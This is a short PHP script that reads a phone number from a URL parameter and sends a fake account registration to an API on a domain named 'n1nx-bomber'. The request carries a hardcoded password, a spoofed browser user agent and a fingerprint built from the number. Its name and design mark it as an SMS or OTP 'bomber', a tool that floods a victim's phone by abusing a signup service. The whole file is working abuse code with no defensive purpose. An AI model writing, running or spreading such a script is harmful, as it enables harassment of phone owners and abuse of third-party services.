<?php
$phn1 = $_GET["phone"];
$phn = ltrim($phn1, '0');
$url = 'https://api.n1nx-bomber.my.id/api/member';
$data = [
    "membercode" => "a".$phn,
    "password" => "Boss2024",
    "currency" => "BDT",
    "email" => "",
    "registration_site" => "desktop",
    "mobile" => $phn,
    "line" => "",
    "referral_code" => "",
    "is_early_bird" => "0",
    "domain" => "https://crazytime.app",
    "language" => "bd",
    "reg_type" => 2,
    "agent_team" => "",
    "utm_source" => null,
    "utm_medium" => null,
    "utm_campaign" => null,
    "s2" => null,
    "fp" => "b9da7f24a57".$phn."ada52d12hdfacc16b23652",
    "c_id" => null,
    "pid" => null,
    "stag" => null,
    "tracking_url" => null,
];

$options = [
    CURLOPT_URL            => $url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => json_encode($data),
    CURLOPT_HTTPHEADER     => [
        'Content-Type: application/json',
        'User-Agent: Mozilla/5.0 (Windows NT 6.0; Win64; x64; en-US) AppleWebKit/602.15 (KHTML, like Gecko) Chrome/49.0.3145.397 Safari/603',
    ],
];

$curl = curl_init();
curl_setopt_array($curl, $options);

$response = curl_exec($curl);

if ($response === false) {
    echo 'Curl error: ' . curl_error($curl);
} else {
    echo 'API Response: ' . $response;
}

curl_close($curl);

?>
